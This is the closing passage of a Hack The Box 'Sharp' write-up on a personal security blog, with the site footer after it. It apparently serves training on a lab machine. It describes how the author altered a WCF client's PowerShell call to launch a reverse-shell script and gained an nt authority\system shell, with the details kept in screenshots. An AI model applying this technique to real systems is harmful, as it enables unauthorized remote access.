<p>When enumeration <code>nmap.full</code> on all ports, we can see that port <code>8889</code> is open on the machine.</p>
<p><img src="/img/sharp/sharp-nmapf.png" alt=""></p>
<p>I change the ip to that of the machine in <code>Client</code> and the function <code>InvokePowershell()</code> with the <code>get-localuser</code> command for POC, but i get a login problem.</p>
<p><img src="/img/sharp/sharp-login.png" alt=""></p>
<p>Creating a network cmd session netonly authenticated as <code>lars</code>.</p>
<p><img src="/img/sharp/sharp-wcf2.png" alt=""></p>
<p>Modified the <code>InvokePowershell()</code> function to put our revshell.ps1.</p>
<p><img src="/img/sharp/sharp-rev.png" alt=""></p>
<p>I run the <code>WcfClient.exe</code> file after opening a listener on port <code>1337</code> and we get a shell as <code>nt authority\system</code>, we can get the last flag <code>root.txt</code>.</p>
<p><img src="/img/sharp/sharp-wcfc.png" alt=""></p>
<p><img src="/img/sharp/sharp-sys.png" alt=""></p>
<p><img src="/img/sharp/sharp-root.txt.png" alt=""></p>
    
</div>

    
<div class="footer">


    
        <div class="tags">
            <i class="fa fa-tags"></i>
            <div class="links">
                
                    
                    
                    <a href="//luksec.fr/tags/powershell/">powershell</a>
                    
                
                    
                    
                    <a href="//luksec.fr/tags/source-code-review/">source code review</a>
                    
                
            </div>
        </div>
    

    
    <div class="languages">
        <i class="fa fa-language"></i>
        <div class="links">
            
                <a href="//luksec.fr/fr/article/sharp/">fr</a>
            
        </div>
    </div>
    
</div>

</article>

        
    </div>

    
        <div id="comments-container">
            
            

        </div>
    

    </div>

    
<footer>
    <div class="container">

        
        <div class="recent-posts">
            <strong>Latest posts</strong>
            <ul>
                
                
                    <li>
                        <a href="//luksec.fr/article/trick/">Hack The Box - Trick</a>
                    </li>
                
                    <li>
                        <a href="//luksec.fr/article/fcsc2022-forensic/">FCSC 2022 - Forensic</a>
                    </li>
                
                    <li>
                        <a href="//luksec.fr/article/fcsc2022-web/">FCSC 2022 - Web</a>
                    </li>
                
                    <li>
                        <a href="//luksec.fr/article/fcsc2022-intro/">FCSC 2022 - Intro</a>
                    </li>
                
                    <li>
                        <a href="//luksec.fr/article/bountyhunter/">Hack The Box - BountyHunter</a>
                    </li>
                
                    <li>
                        <a href="//luksec.fr/article/advuln/">Setting up a vulnerable AD environment</a>
                    </li>
                
                    <li>
                        <a href="//luksec.fr/article/spring4shell/">TryHackMe - Spring4shell</a>
                    </li>
                
            </ul>
        </div>
        

        
        <div class="categories">
            <a href="/categories/"><strong>Categories</strong></a>
            <ul>
                
                <li>
                    <a href="/categories/ctf">Ctf
                        (24)</a>
                </li>
                
                <li>
                    <a href="/categories/htb">Htb
                        (21)</a>
                </li>
                
                <li>
                    <a href="/categories/write-up">Write up
                        (18)</a>
                </li>
                
                <li>
                    <a href="/categories/linux">Linux
                        (15)</a>
                </li>
                
                <li>
                    <a href="/categories/windows">Windows
                        (4)</a>
                </li>
                
                <li>
                    <a href="/categories/writeup">Writeup
                        (4)</a>
                </li>
                
                <li>
                    <a href="/categories/fcsc">Fcsc
                        (3)</a>
                </li>
                
            </ul>
        </div>
        

        <div class="right">
            
            <div class="external-profiles">
                <strong>Social media</strong>

                
                <a href="https://twitter.com/luksec_" target="_blank"><i class="fab fa-twitter"></i></a>
                
                <a href="https://github.com/0xLuks" target="_blank"><i class="fab fa-github"></i></a>
                
            </div>
            

            <div class="languages">
                <strong>Other languages</strong>
                
                
                <a href="//luksec.fr/" class="active">en</a>
                
                
                
                <a href="//luksec.fr/fr/">fr</a>
                
                
                <br><br>
                <script src="https://www.hackthebox.eu/badge/483643"></script>
            </div>
            
        </div>
    </div>
    <script data-name="BMC-Widget" data-cfasync="false" src="https://cdnjs.buymeacoffee.com/1.0.0/widget.prod.min.js" data-id="luks" data-description="Support me on Buy me a coffee!" data-message="" data-color="#FFDD00" data-position="Right" data-x_margin="18" data-y_margin="18">
    </script>
</footer>


<div class="credits">
    <div class="container">
        <div class="copyright">
            <a href="https://github.com/Lednerb" target="_blank">
                &copy;
                
                2022
                
                by Lucas L.
            </a>
            
        </div>
        <div class="author">
            <a href="https://github.com/Lednerb/bilberry-hugo-theme"
                target="_blank">Bilberry Hugo Theme</a>
        </div>
    </div>
</div>


    

    


    <script type="text/javascript" src="//luksec.fr/theme.js"></script>

    
    
    

    
</body>

</html>
